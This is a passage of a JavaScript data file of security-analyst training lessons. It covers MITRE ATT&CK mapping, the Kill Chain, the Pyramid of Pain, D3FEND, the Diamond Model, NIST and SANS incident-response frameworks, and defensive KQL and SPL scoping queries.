    ["olevba", "oletools utility extracting and analyzing VBA macros in Office files"],
    ["Template injection", "Office document loading a remote template that contains malicious content"],
    ["Sandbox", "Isolated environment that executes samples and records their behavior"],
    ["Certificate transparency", "Public logs of issued TLS certificates, searchable at crt.sh"],
    ["Purge", "Removing delivered malicious messages from all mailboxes"],
    ["Session revocation", "Invalidating refresh tokens and sessions so stolen cookies stop working"]
  ],
  standards: ["MITRE ATT&CK T1566.001", "MITRE ATT&CK T1566.002", "MITRE ATT&CK T1114.003"],
  labs: ["lab-phishing", "lab-ioc-triage"]
}
);

/* ===================== p2-m7 Threat Frameworks ===================== */
CP.lessons.push(
{
  id: "p2-m7-l1",
  module: "p2-m7",
  title: "MITRE ATT&CK in Practice",
  minutes: 22,
  objectives: [
    "Describe the structure of ATT&CK: tactics, techniques, sub-techniques, procedures, groups, software, mitigations",
    "List the 14 Enterprise tactics in order",
    "Map observed activity from an alert or incident to ATT&CK techniques",
    "Use ATT&CK Navigator for coverage analysis and know how detection guidance is structured"
  ],
  html: `
<p><b>MITRE ATT&amp;CK</b> (Adversarial Tactics, Techniques, and Common Knowledge) is a globally used knowledge base of adversary behavior derived from real-world observations. It gives defenders a shared vocabulary: instead of "the attacker did something sneaky with scheduled tasks," you say <b>T1053.005 &ndash; Scheduled Task/Job: Scheduled Task</b>, and everyone from your detection engineer to your vendor knows what you mean.</p>

<h3>Structure</h3>
<ul>
  <li><b>Tactics</b> &mdash; the adversary's <i>why</i>: the tactical goal (e.g., Persistence). IDs like TA0003.</li>
  <li><b>Techniques</b> &mdash; <i>how</i> the goal is achieved (e.g., T1547 Boot or Logon Autostart Execution).</li>
  <li><b>Sub-techniques</b> &mdash; more specific variants (T1547.001 Registry Run Keys / Startup Folder).</li>
  <li><b>Procedures</b> &mdash; the specific implementation by a group or malware ("APT29 used a Run key named 'OneDriveUpdate'").</li>
  <li><b>Groups</b> (e.g., G0016 APT29), <b>Software</b> (S0154 Cobalt Strike), <b>Campaigns</b>, <b>Mitigations</b> (M1026 Privileged Account Management), and detection guidance.</li>
</ul>
<p>There are three matrices: <b>Enterprise</b> (Windows, macOS, Linux, cloud/IaaS, SaaS, Office Suite, Identity Provider, network devices, containers, ESXi), <b>Mobile</b> and <b>ICS</b>. ATT&amp;CK is released twice a year (roughly April and October). v16 (late 2024) restructured cloud platforms, v17 added ESXi, and v18 (late 2025) overhauled detection guidance into <b>Detection Strategies</b> and <b>Analytics</b> linked to log sources, replacing the older free-text detection notes and data-component mapping.</p>

<h3>The 14 Enterprise tactics</h3>
<table>
  <tr><th>#</th><th>Tactic</th><th>Adversary goal</th><th>Example technique</th></tr>
  <tr><td>1</td><td>Reconnaissance (TA0043)</td><td>Gather info to plan</td><td>T1593 Search Open Websites/Domains</td></tr>
  <tr><td>2</td><td>Resource Development (TA0042)</td><td>Build infrastructure/capabilities</td><td>T1583 Acquire Infrastructure</td></tr>
  <tr><td>3</td><td>Initial Access (TA0001)</td><td>Get in</td><td>T1566 Phishing, T1190 Exploit Public-Facing Application</td></tr>
  <tr><td>4</td><td>Execution (TA0002)</td><td>Run code</td><td>T1059 Command and Scripting Interpreter</td></tr>
  <tr><td>5</td><td>Persistence (TA0003)</td><td>Stay in</td><td>T1053 Scheduled Task/Job</td></tr>
  <tr><td>6</td><td>Privilege Escalation (TA0004)</td><td>Gain higher permissions</td><td>T1068 Exploitation for Privilege Escalation</td></tr>
  <tr><td>7</td><td>Defense Evasion (TA0005)</td><td>Avoid detection</td><td>T1562 Impair Defenses, T1218 System Binary Proxy Execution</td></tr>
  <tr><td>8</td><td>Credential Access (TA0006)</td><td>Steal credentials</td><td>T1003 OS Credential Dumping</td></tr>
  <tr><td>9</td><td>Discovery (TA0007)</td><td>Learn the environment</td><td>T1087 Account Discovery</td></tr>
  <tr><td>10</td><td>Lateral Movement (TA0008)</td><td>Move through the environment</td><td>T1021 Remote Services</td></tr>
  <tr><td>11</td><td>Collection (TA0009)</td><td>Gather target data</td><td>T1560 Archive Collected Data</td></tr>
  <tr><td>12</td><td>Command and Control (TA0011)</td><td>Communicate with implants</td><td>T1071 Application Layer Protocol</td></tr>
  <tr><td>13</td><td>Exfiltration (TA0010)</td><td>Steal data</td><td>T1567 Exfiltration Over Web Service</td></tr>
  <tr><td>14</td><td>Impact (TA0040)</td><td>Disrupt, destroy, encrypt, extort</td><td>T1486 Data Encrypted for Impact</td></tr>
</table>
<p>The tactics are not a strict sequence &mdash; attackers loop through Discovery, Credential Access and Lateral Movement many times &mdash; but the left-to-right order is a useful mental model.</p>

<h3>Mapping an incident</h3>
<p>Observed activity from a real-world-style intrusion:</p>
<table>
  <tr><th>Observation</th><th>Technique</th></tr>
  <tr><td>User opened ZIP from email containing a LNK file</td><td>T1566.001 Spearphishing Attachment; T1204.002 User Execution: Malicious File</td></tr>
  <tr><td>LNK ran hidden PowerShell download cradle</td><td>T1059.001 PowerShell; T1105 Ingress Tool Transfer</td></tr>
  <tr><td>DLL executed with rundll32</td><td>T1218.011 Rundll32</td></tr>
  <tr><td>Run key "OneDriveUpdate" created</td><td>T1547.001</td></tr>
  <tr><td><code>nltest /domain_trusts</code>, <code>net group "domain admins" /domain</code></td><td>T1482 Domain Trust Discovery; T1069.002 Domain Groups</td></tr>
  <tr><td>LSASS dumped via comsvcs.dll</td><td>T1003.001 LSASS Memory</td></tr>
  <tr><td>PsExec to file server</td><td>T1569.002 Service Execution; T1021.002 SMB/Windows Admin Shares</td></tr>
  <tr><td>rclone upload to cloud storage</td><td>T1567.002 Exfiltration to Cloud Storage</td></tr>
  <tr><td>Shadow copies deleted, files encrypted</td><td>T1490 Inhibit System Recovery; T1486</td></tr>
</table>

<div class="callout tip"><b>Tip:</b> Map the <b>behavior</b>, not the tool. "Mimikatz" is software S0002; what it did on this host (LSASS memory read) is T1003.001. When unsure between two techniques, read both technique pages' descriptions &mdash; and MITRE's free <b>ATT&amp;CK Workbench</b> and the CISA <b>Decider</b> tool help guide mapping.</div>

<h3>ATT&amp;CK Navigator and coverage</h3>
<p>The <b>ATT&amp;CK Navigator</b> is a web tool for coloring the matrix. Common layers:</p>
<ul>
  <li><b>Detection coverage</b>: techniques where you have validated detections (green), partial (yellow), none (red).</li>
  <li><b>Threat profile</b>: techniques used by groups that target your sector (e.g., ransomware affiliates targeting healthcare).</li>
  <li><b>Gap analysis</b>: overlay the two &mdash; red cells in the threat profile are your priority.</li>
</ul>
<p>Beware the "coverage heat map" trap: a technique such as T1059 has endless variations; one rule does not mean "covered." Track coverage at the sub-technique and procedure level, and validate with tests.</p>

<div class="callout real"><b>On the job:</b> Most SIEM and EDR alerts are tagged with ATT&amp;CK technique IDs. Including the tactic and technique in your ticket notes helps Tier 2 instantly understand where in the attack lifecycle you are &mdash; "Credential Access on a server" is far more urgent than "Discovery on a workstation."</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 explicitly lists MITRE ATT&amp;CK, the Diamond Model, the Cyber Kill Chain, OSSTMM and OWASP Testing Guide. Expect questions identifying a tactic from a description (e.g., "attacker deleted logs" = Defense Evasion). BTL1 and SC-200 also use ATT&amp;CK mappings throughout.</div>
`,
  keyTerms: [
    ["Tactic", "The adversary's tactical goal, e.g. Persistence (the 'why')"],
    ["Technique", "How a tactic is achieved, e.g. T1053 Scheduled Task/Job (the 'how')"],
    ["Sub-technique", "Specific variant of a technique, e.g. T1053.005"],
    ["Procedure", "Specific real-world implementation of a technique by a group or tool"],
    ["ATT&CK Navigator", "Web tool for annotating and visualizing ATT&CK matrices"],
    ["Detection Strategy", "ATT&CK object (from v18) describing how to detect a technique using analytics and log sources"],
    ["Coverage map", "Visualization of which techniques your detections address"]
  ],
  standards: ["MITRE ATT&CK Enterprise"],
  labs: ["lab-attack-mapping"]
},
{
  id: "p2-m7-l2",
  module: "p2-m7",
  title: "Cyber Kill Chain, Pyramid of Pain and D3FEND",
  minutes: 18,
  objectives: [
    "Describe the seven phases of the Lockheed Martin Cyber Kill Chain and its limitations",
    "Explain the Pyramid of Pain and why behavioral detection beats indicator matching",
    "Use MITRE D3FEND to describe defensive countermeasures",
    "Choose the right framework for a given communication or analysis need"
  ],
  html: `
<p>Frameworks are lenses. ATT&amp;CK is a detailed encyclopedia; the frameworks in this lesson are simpler models that help you prioritize and communicate.</p>

<h3>Lockheed Martin Cyber Kill Chain (2011)</h3>
<table>
  <tr><th>Phase</th><th>Attacker action</th><th>Defender opportunity</th></tr>
  <tr><td>1. Reconnaissance</td><td>Research targets, harvest emails, scan</td><td>Monitor for scanning; reduce public exposure</td></tr>
  <tr><td>2. Weaponization</td><td>Couple exploit with payload (malicious document, loader)</td><td>Intel on attacker tooling (mostly invisible to you)</td></tr>
  <tr><td>3. Delivery</td><td>Email, web, USB, exposed service</td><td>Email filtering, web proxy, WAF</td></tr>
  <tr><td>4. Exploitation</td><td>Trigger vulnerability or user execution</td><td>Patching, ASR rules, exploit protection</td></tr>
  <tr><td>5. Installation</td><td>Install implant, persistence</td><td>EDR, application control</td></tr>
  <tr><td>6. Command &amp; Control</td><td>Establish C2 channel</td><td>DNS/proxy filtering, NSM, beacon detection</td></tr>
  <tr><td>7. Actions on Objectives</td><td>Exfiltration, encryption, destruction</td><td>DLP, backups, segmentation, IR</td></tr>
</table>
<p>The key insight: <b>breaking any link stops the chain</b>, and the earlier you break it, the cheaper the incident. Its limitations: it is perimeter- and malware-centric, models a single linear intrusion, and fits poorly to insider threats, cloud identity attacks and the long internal phase (lateral movement) where most modern response happens. The <b>Unified Kill Chain</b> (Paul Pols, 2017) extends it to 18 phases grouped as In, Through and Out, combining Kill Chain and ATT&amp;CK ideas.</p>

<h3>The Pyramid of Pain (David Bianco, 2013)</h3>
<pre><code>            [ TTPs ]                         Tough!
          [   Tools   ]                      Challenging
     [ Network / Host Artifacts ]            Annoying
        [   Domain Names    ]                Simple
       [    IP Addresses     ]               Easy
      [     Hash Values       ]              Trivial</code></pre>
<p>The pyramid ranks indicators by how much pain it causes the <i>adversary</i> when you detect and deny them:</p>
<ul>
  <li><b>Hash values</b> &mdash; trivial to change; recompile or flip one byte.</li>
  <li><b>IP addresses</b> &mdash; easy; new VPS or proxy in minutes.</li>
  <li><b>Domain names</b> &mdash; simple; register a new one for a few dollars.</li>
  <li><b>Network/host artifacts</b> &mdash; annoying; URI patterns, user agents, named pipes, registry keys require tool reconfiguration.</li>
  <li><b>Tools</b> &mdash; challenging; forcing a group to abandon its favorite tooling costs time and money.</li>
  <li><b>TTPs</b> &mdash; tough; changing <i>how</i> they operate (e.g., no longer dumping LSASS) is the hardest of all.</li>
</ul>
<p>Practical consequence: IOC blocking is necessary hygiene, but your best detections target behaviors near the top. "Any process except approved ones reading LSASS memory" survives tool changes; "block hash 9F2B...C41A" does not survive a recompile.</p>

<div class="callout tip"><b>Tip:</b> In an interview, when asked "how would you detect X?", start with the behavior (top of the pyramid) and then mention indicators as supplementary. It signals mature thinking.</div>

<h3>MITRE D3FEND</h3>
<p><b>D3FEND</b> is a knowledge graph of defensive countermeasures, funded by the NSA and maintained by MITRE &mdash; the defensive counterpart to ATT&amp;CK. D3FEND 1.0 (2025) organizes techniques under tactics:</p>
<table>
  <tr><th>Tactic</th><th>Example technique</th></tr>
  <tr><td><b>Model</b></td><td>Asset Inventory, Network Mapping</td></tr>
  <tr><td><b>Harden</b></td><td>Multi-factor Authentication, Application Configuration Hardening</td></tr>
  <tr><td><b>Detect</b></td><td>Process Spawn Analysis, Network Traffic Analysis</td></tr>
  <tr><td><b>Isolate</b></td><td>Network Isolation, Executable Allowlisting</td></tr>
  <tr><td><b>Deceive</b></td><td>Decoy File, Honeynet</td></tr>
  <tr><td><b>Evict</b></td><td>Account Locking, Process Termination, Credential Revoking</td></tr>
  <tr><td><b>Restore</b></td><td>Restore from backup, Reissue credentials</td></tr>
</table>
<p>D3FEND maps countermeasures to the digital artifacts they act on, and through those to ATT&amp;CK techniques, so you can ask "which defenses address T1003.001?" and get answers such as credential hardening and process access monitoring. It is especially useful for architecture reviews and for writing precise recommendations in incident reports.</p>

<h3>Choosing a framework</h3>
<table>
  <tr><th>Need</th><th>Best fit</th></tr>
  <tr><td>Explain an incident to executives</td><td>Kill Chain (simple, linear)</td></tr>
  <tr><td>Tag alerts, measure detection coverage</td><td>ATT&amp;CK</td></tr>
  <tr><td>Decide which indicators/detections to invest in</td><td>Pyramid of Pain</td></tr>
  <tr><td>Recommend defensive controls</td><td>D3FEND (plus ATT&amp;CK mitigations)</td></tr>
  <tr><td>Analyze and cluster intrusions by adversary</td><td>Diamond Model (next lesson)</td></tr>
</table>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 names the Cyber Kill Chain and Diamond Model; the Pyramid of Pain is a common BTL1 and interview topic. Know the seven Kill Chain phases in order and which pyramid level is "trivial" (hashes) versus "tough" (TTPs).</div>
`,
  keyTerms: [
    ["Cyber Kill Chain", "Lockheed Martin's seven-phase intrusion model from reconnaissance to actions on objectives"],
    ["Weaponization", "Kill Chain phase where an exploit is paired with a deliverable payload"],
    ["Unified Kill Chain", "18-phase model combining Kill Chain and ATT&CK concepts"],
    ["Pyramid of Pain", "Model ranking indicator types by the cost their denial imposes on adversaries"],
    ["TTPs", "Tactics, Techniques and Procedures: how an adversary operates"],
    ["IOC", "Indicator of Compromise, such as a hash, IP or domain"],
    ["D3FEND", "MITRE knowledge graph of defensive countermeasure techniques"]
  ],
  standards: ["MITRE D3FEND 1.0", "MITRE ATT&CK Enterprise"],
  labs: ["lab-attack-mapping", "lab-ioc-triage"]
},
{
  id: "p2-m7-l3",
  module: "p2-m7",
  title: "The Diamond Model and Combining Frameworks",
  minutes: 18,
  objectives: [
    "Describe the four core features and meta-features of the Diamond Model",
    "Pivot between features to discover related infrastructure and victims",
    "Build activity threads linking events across an intrusion",
    "Combine ATT&CK, Kill Chain, Pyramid of Pain and Diamond in one analysis"
  ],
  html: `
<p>The <b>Diamond Model of Intrusion Analysis</b> (Caltagirone, Pendergast and Betz, 2013) states that every intrusion event has four core features connected like the corners of a diamond:</p>
<pre><code>                  Adversary
                 /         \\
                /           \\
       Infrastructure ---- Capability
                \\           /
                 \\         /
                   Victim</code></pre>
<ul>
  <li><b>Adversary</b> &mdash; the actor (operator and customer may differ, e.g., ransomware-as-a-service affiliate vs. developer).</li>
  <li><b>Capability</b> &mdash; tools and techniques used (malware, exploit, TTPs).</li>
  <li><b>Infrastructure</b> &mdash; physical/logical resources used to deliver capability or maintain control (IPs, domains, email accounts, C2 servers). Type 1 is attacker-owned; Type 2 is compromised third-party or intermediary infrastructure.</li>
  <li><b>Victim</b> &mdash; the target: person, organization, asset (victim persona and victim asset).</li>
</ul>
<p>The central axiom: <i>an adversary deploys a capability over infrastructure against a victim</i>. Meta-features include timestamp, phase, result, direction, methodology and resources. Two extended axes: the <b>socio-political</b> axis (adversary&ndash;victim relationship, motivation) and the <b>technology</b> axis (capability&ndash;infrastructure relationship).</p>

<h3>Pivoting</h3>
<p>The model's power is <b>analytic pivoting</b>: knowing one corner helps discover others.</p>
<table>
  <tr><th>Start</th><th>Pivot</th><th>Discover</th></tr>
  <tr><td>Victim (your host)</td><td>EDR network logs</td><td>Infrastructure: C2 IP 91.215.85.17</td></tr>
  <tr><td>Infrastructure (IP)</td><td>Passive DNS, certificate data, Shodan/Censys</td><td>More infrastructure: 6 domains sharing the same TLS cert / JA4S / hosting pattern</td></tr>
  <tr><td>Infrastructure (domains)</td><td>Malware repositories, sandbox reports</td><td>Capability: samples contacting those domains (a loader family)</td></tr>
  <tr><td>Capability (loader)</td><td>Threat intel reports</td><td>Adversary: a tracked initial-access broker; other victims in your sector</td></tr>
  <tr><td>Adversary</td><td>Known TTPs (ATT&amp;CK group page)</td><td>What to hunt for next in your environment</td></tr>
</table>

<h3>Activity threads and groups</h3>
<p>Each diamond represents one <b>event</b>. Linking events in order (phishing email &rarr; execution &rarr; C2 &rarr; lateral movement) creates an <b>activity thread</b>, usually aligned to Kill Chain phases. Clustering threads that share features (same infrastructure patterns, same tools, same victimology) forms <b>activity groups</b> &mdash; which is how intelligence teams track clusters like "UNC" or "Storm-" designations before attributing them to named actors.</p>

<h3>Worked example: all frameworks together</h3>
<p>Incident: an accounts-payable clerk receives a QR-code PDF; credentials are captured by an AiTM page; the attacker creates an inbox rule and sends fraudulent invoices to customers.</p>
<table>
  <tr><th>Framework</th><th>Use</th></tr>
  <tr><td><b>Diamond</b></td><td>Adversary: financially motivated BEC actor. Capability: PhaaS AiTM kit, inbox rule manipulation. Infrastructure: look-alike domain, Cloudflare-hosted proxy, residential proxy IPs for sign-in. Victim: AP clerk mailbox; secondary victims are customers.</td></tr>
  <tr><td><b>Kill Chain</b></td><td>Delivery (email with QR) &rarr; Exploitation (user enters creds) &rarr; Installation (session token + inbox rule as persistence) &rarr; Actions on Objectives (invoice fraud).</td></tr>
  <tr><td><b>ATT&amp;CK</b></td><td>T1566.001, T1557 (AiTM), T1539 Steal Web Session Cookie, T1550.004 Web Session Cookie, T1564.008 Email Hiding Rules, T1534 Internal Spearphishing, T1657 Financial Theft.</td></tr>
  <tr><td><b>Pyramid of Pain</b></td><td>Blocking the domain and IPs is quick but low-pain. High-pain defenses: phishing-resistant MFA and token protection (defeats the TTP), alerts on new hiding inbox rules.</td></tr>
  <tr><td><b>D3FEND</b></td><td>Harden: strong MFA; Detect: user behavior analysis; Evict: session/credential revoking.</td></tr>
</table>

<div class="callout tip"><b>Tip:</b> Use the Diamond Model to structure your notes during a complex investigation. Four headings &mdash; Adversary, Capability, Infrastructure, Victim &mdash; quickly show what you know and what gaps remain.</div>

<div class="callout real"><b>On the job:</b> Threat intelligence platforms (MISP, OpenCTI) store relationships that naturally map to the Diamond: threat actor &ndash;uses&rarr; malware &ndash;communicates-with&rarr; infrastructure &ndash;targets&rarr; identity/sector. When you pivot in a TIP, you are doing Diamond analysis whether you call it that or not.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 objective 1.4 lists the Diamond Model; know the four vertices and that infrastructure connects adversary to victim. BTL1's threat intelligence section also covers it.</div>
`,
  keyTerms: [
    ["Diamond Model", "Intrusion analysis model with four core features: adversary, capability, infrastructure, victim"],
    ["Capability", "Tools and techniques an adversary uses in an event"],
    ["Infrastructure", "Resources used to deliver capabilities or maintain control (IPs, domains, accounts)"],
    ["Meta-features", "Additional event attributes such as timestamp, phase, result and direction"],
    ["Analytic pivoting", "Using a known feature to discover related features"],
    ["Activity thread", "Ordered sequence of diamond events in an intrusion"],
    ["Activity group", "Cluster of similar events/threads attributed to the same set of operators"]
  ],
  standards: ["MITRE ATT&CK Enterprise"],
  labs: ["lab-attack-mapping", "lab-ioc-triage"]
}
);

/* ===================== p3-m1 Incident Response Lifecycle ===================== */
CP.lessons.push(
{
  id: "p3-m1-l1",
  module: "p3-m1",
  title: "IR Frameworks: NIST SP 800-61 Rev. 3 and SANS PICERL",
  minutes: 20,
  objectives: [
    "Explain how NIST SP 800-61 Rev. 3 (April 2025) aligns incident response to the CSF 2.0 Functions",
    "Compare Rev. 3 with the legacy Rev. 2 four-phase lifecycle and SANS PICERL",
    "Define event, incident and breach and explain why the distinctions matter",
    "Describe the preparation an organization needs before an incident"
  ],
  html: `
<p>Incident response (IR) is the organized approach to handling a security incident so that damage, recovery time and cost are minimized. Frameworks give everyone &mdash; analysts, IT, legal, executives &mdash; the same map of what happens next.</p>

<h3>Events, incidents, breaches</h3>
<ul>
  <li><b>Event</b>: any observable occurrence (a logon, a firewall deny). Millions per day.</li>
  <li><b>Adverse event / alert</b>: an event with a negative consequence or signal of possible harm.</li>
  <li><b>Incident</b>: an occurrence that actually or imminently jeopardizes the confidentiality, integrity or availability of information or systems, or violates security policy.</li>
  <li><b>Breach</b>: an incident involving confirmed unauthorized access to or disclosure of protected data &mdash; a legal term that triggers notification duties. Only legal counsel should declare something a "breach."</li>
</ul>

<h3>NIST SP 800-61 Rev. 3 (April 2025)</h3>
<p>Rev. 3, <i>Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile</i>, replaced Rev. 2 (2012). Rather than a stand-alone lifecycle, it treats incident response as part of overall cybersecurity risk management and maps IR activities to the six <b>NIST CSF 2.0 Functions</b>:</p>
<table>
  <tr><th>CSF 2.0 Function</th><th>Role in incident response</th></tr>
  <tr><td><b>Govern (GV)</b></td><td>IR policy, roles and responsibilities, risk strategy, legal and regulatory requirements, supplier responsibilities</td></tr>
  <tr><td><b>Identify (ID)</b></td><td>Asset inventory, risk assessment, and <b>Improvement (ID.IM)</b> &mdash; lessons learned from incidents feed back here</td></tr>
  <tr><td><b>Protect (PR)</b></td><td>Safeguards that reduce incident likelihood and impact: identity, training, data security, platform hardening, resilient architecture</td></tr>
  <tr><td><b>Detect (DE)</b></td><td>Continuous monitoring (DE.CM) and adverse event analysis (DE.AE) &mdash; finding and analyzing possible incidents</td></tr>
  <tr><td><b>Respond (RS)</b></td><td>Incident management (RS.MA), analysis (RS.AN), reporting and communication (RS.CO), mitigation (RS.MI)</td></tr>
  <tr><td><b>Recover (RC)</b></td><td>Recovery plan execution (RC.RP) and recovery communication (RC.CO)</td></tr>
</table>
<p>Govern, Identify and Protect are the <b>preparation</b> layer that supports all response; Detect, Respond and Recover are the <b>incident response</b> activities themselves. Improvement is continuous rather than a final phase &mdash; lessons are captured during and after every incident.</p>

<h3>The legacy Rev. 2 lifecycle (still widely used)</h3>
<ol>
  <li><b>Preparation</b></li>
  <li><b>Detection and Analysis</b></li>
  <li><b>Containment, Eradication and Recovery</b></li>
  <li><b>Post-Incident Activity</b></li>
</ol>
<p>Many organizations' plans, many exam questions and most textbooks still use these four phases, and Rev. 3 explicitly acknowledges that existing lifecycle models remain valid. Know both.</p>

<h3>SANS PICERL</h3>
<table>
  <tr><th>SANS phase</th><th>Key activities</th><th>NIST Rev. 2 equivalent</th></tr>
  <tr><td><b>P</b>reparation</td><td>Plans, playbooks, tools, training, contacts, logging</td><td>Preparation</td></tr>
  <tr><td><b>I</b>dentification</td><td>Detect, triage, determine scope and severity</td><td>Detection &amp; Analysis</td></tr>
  <tr><td><b>C</b>ontainment</td><td>Short-term (isolate) and long-term (rebuild clean systems, temporary controls)</td><td rowspan="3">Containment, Eradication &amp; Recovery</td></tr>
  <tr><td><b>E</b>radication</td><td>Remove malware, persistence, attacker accounts; fix root cause</td></tr>
  <tr><td><b>R</b>ecovery</td><td>Restore to production, monitor closely for reinfection</td></tr>
  <tr><td><b>L</b>essons learned</td><td>Post-incident review, report, improvements</td><td>Post-Incident Activity</td></tr>
</table>
<p>SANS splits containment, eradication and recovery into separate phases, which is helpful in practice because each has different owners and completion criteria.</p>

<h3>Preparation that actually matters</h3>
<ul>
  <li><b>Incident response plan</b> approved by leadership: scope, severity definitions, roles (incident commander, scribe, technical leads, communications, legal), escalation paths.</li>
  <li><b>Playbooks</b> for top scenarios: ransomware, BEC, credential compromise, data exfiltration, insider, cloud account takeover.</li>
  <li><b>Contact lists</b> including out-of-band channels (if email and Teams are compromised, how do you talk?), external IR retainer, cyber insurer, outside counsel, law enforcement contacts.</li>
  <li><b>Logging and visibility</b> sufficient to investigate (identity, EDR, DNS, cloud audit) with adequate retention.</li>
  <li><b>Jump kit</b>: forensic workstation, write blockers, clean media, imaging and triage tools (KAPE, Velociraptor), documentation templates.</li>
  <li><b>Exercises</b>: tabletop exercises at least annually, including executives; technical drills for the SOC.</li>
  <li><b>Tested backups</b> &mdash; offline/immutable, with restore times known.</li>
</ul>

<div class="callout warn"><b>Warning:</b> Using the word "breach" in an email or ticket can have legal consequences, since it may imply notification obligations. Use "incident" or "potential incident" and let legal counsel make the determination. Many organizations route IR communications through counsel to preserve attorney-client privilege.</div>

<div class="callout real"><b>On the job:</b> Your first real incident will feel chaotic. The plan's real value is answering "who decides?" &mdash; who can approve taking a production system offline, who talks to the press, who calls the insurer. Read your organization's IR plan in your first month.</div>

<div class="callout exam"><b>Exam alignment:</b> CySA+ CS0-003 Domain 3 (Incident Response and Management, 20%) tests the IR lifecycle, preparation and post-incident activities. Questions may use the four-phase NIST model; know how Rev. 3 maps to CSF 2.0 too. CISSP Domain 7 uses a seven-step model (Detection, Response, Mitigation, Reporting, Recovery, Remediation, Lessons Learned) &mdash; same ideas, different labels.</div>
`,
  keyTerms: [
    ["Incident", "Occurrence that actually or imminently jeopardizes CIA or violates security policy"],
    ["Breach", "Incident with confirmed unauthorized access to protected data; a legal determination"],
    ["NIST SP 800-61 Rev. 3", "2025 NIST IR guidance structured as a CSF 2.0 Community Profile"],
    ["CSF 2.0 Functions", "Govern, Identify, Protect, Detect, Respond, Recover"],
    ["PICERL", "SANS IR phases: Preparation, Identification, Containment, Eradication, Recovery, Lessons learned"],
    ["Incident commander", "Person with overall authority and coordination responsibility during an incident"],
    ["Tabletop exercise", "Discussion-based walkthrough of an incident scenario to test plans and roles"],
    ["Jump kit", "Pre-assembled tools and media ready for incident response"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "NIST CSF 2.0", "NIST SP 800-61 Rev. 2"],
  labs: ["lab-ir-tabletop"]
},
{
  id: "p3-m1-l2",
  module: "p3-m1",
  title: "Scoping, Containment, Eradication and Recovery",
  minutes: 22,
  objectives: [
    "Scope an incident by identifying affected users, hosts, data and timeframe",
    "Choose containment strategies that balance evidence, business impact and attacker awareness",
    "Plan eradication that removes all footholds, not just the obvious malware",
    "Define recovery criteria and post-recovery monitoring"
  ],
  html: `
<p>Once an alert becomes an incident, the questions change from "is this bad?" to "how bad, how wide, and how do we stop it without making it worse?"</p>

<h3>Scoping</h3>
<p>Scope is defined by <b>who, what, where and when</b>:</p>
<ul>
  <li><b>Patient zero and initial access vector</b> &mdash; how did they get in? Until you know, you cannot close the door.</li>
  <li><b>Affected identities</b> &mdash; every account the attacker used or could have harvested.</li>
  <li><b>Affected hosts</b> &mdash; pivot on IOCs and TTPs across the fleet (hashes, C2 domains, named pipes, service names, logons from compromised accounts).</li>
  <li><b>Data</b> &mdash; what could they access, and is there evidence of staging or exfiltration?</li>
  <li><b>Timeframe</b> &mdash; earliest evidence of compromise (not the first alert).</li>
</ul>
<pre><code>KQL - every device that touched known IOCs:
let iocs = dynamic(["91.215.85.17","updcheck-cdn.example"]);
DeviceNetworkEvents
| where Timestamp &gt; ago(30d)
| where RemoteIP in (iocs) or RemoteUrl has_any (iocs)
| summarize First = min(Timestamp), Last = max(Timestamp), Procs = make_set(InitiatingProcessFileName) by DeviceName

SPL - where did the compromised account log on?
index=wineventlog EventCode=4624 Account_Name="svc_sql" earliest=-30d
| stats earliest(_time) AS first latest(_time) AS last values(Logon_Type) AS types BY host Source_Network_Address
| convert ctime(first) ctime(last)</code></pre>
<p>Scoping is iterative: each new host reveals new indicators, which reveal more hosts. Track everything in an <b>incident timeline</b> and an <b>indicator list</b> as you go.</p>

<h3>Containment</h3>
<h4>Short-term containment</h4>
<ul>
  <li>EDR network isolation of affected hosts.</li>
  <li>Disable compromised accounts; reset passwords; <b>revoke sessions and tokens</b>.</li>
  <li>Block C2 domains and IPs at DNS, proxy and firewall.</li>
  <li>Segment or shut down network paths (e.g., block SMB between VLANs during ransomware spread).</li>
</ul>
<h4>Long-term containment</h4>
<ul>
  <li>Temporary compensating controls while rebuilding (extra monitoring, restricted admin access, conditional access policies).</li>
  <li>Stand up clean replacement systems in parallel.</li>
</ul>
<h4>Containment trade-offs</h4>
<table>
  <tr><th>Consideration</th><th>Question</th></tr>
  <tr><td>Evidence preservation</td><td>Have we captured memory and triage data before isolating or shutting down?</td></tr>
  <tr><td>Business impact</td><td>What breaks if we isolate this server? Who must approve?</td></tr>
  <tr><td>Attacker awareness</td><td>If we act on one host, will the attacker notice and switch to destructive actions or other footholds?</td></tr>
  <tr><td>Completeness</td><td>Have we identified enough of the scope to contain everything at once?</td></tr>
</table>
<p>For sophisticated intrusions, responders often observe quietly while scoping, then execute a coordinated <b>"eviction day"</b> that removes all access at once. For ransomware in progress, speed wins &mdash; contain immediately.</p>

<div class="callout warn"><b>Warning:</b> Do not "tip off" a stealthy attacker by blocking one C2 domain or resetting one password while they still hold five other footholds. Partial containment teaches the attacker what you know and can trigger them to deploy ransomware early. Coordinate with the incident commander.</div>

<h3>Eradication</h3>
<ul>
  <li>Remove malware and <b>all persistence</b> (services, tasks, Run keys, WMI subscriptions, web shells, rogue accounts, RMM tools, OAuth apps, mailbox rules, cloud access keys).</li>
  <li>Prefer <b>rebuilding from known-good images</b> over "cleaning" heavily compromised hosts.</li>
  <li>Fix the <b>root cause</b>: patch the exploited VPN appliance, enforce MFA, remove the exposed RDP.</li>
  <li>For domain compromise: reset privileged credentials, reset <code>krbtgt</code> twice, review GPOs and AD delegations, rotate service account and cloud secrets.</li>
</ul>

<h3>Recovery</h3>
<ul>
  <li>Restore from backups verified to pre-date the compromise and scanned for malware.</li>
  <li>Bring systems back in priority order (identity, then core infrastructure, then business applications) per the business impact analysis.</li>
  <li><b>Heightened monitoring</b> for weeks afterward: the same attacker frequently attempts to return.</li>
  <li>Define clear <b>recovery criteria</b>: what must be true before declaring the incident closed?</li>
</ul>

<div class="callout tip"><b>Tip:</b> Keep a running timeline in UTC from the first minute: what happened (attacker actions) and what was done (responder actions). Columns: time, source, host, user, description, evidence reference, analyst. It becomes the backbone of the final report.</div>

<div class="callout real"><b>On the job:</b> As a Tier 1/2 analyst during a major incident you will typically run assigned scoping queries, collect triage packages, watch for new IOC hits and keep the timeline updated. Reliable, well-documented execution of these tasks is what incident commanders remember.</div>

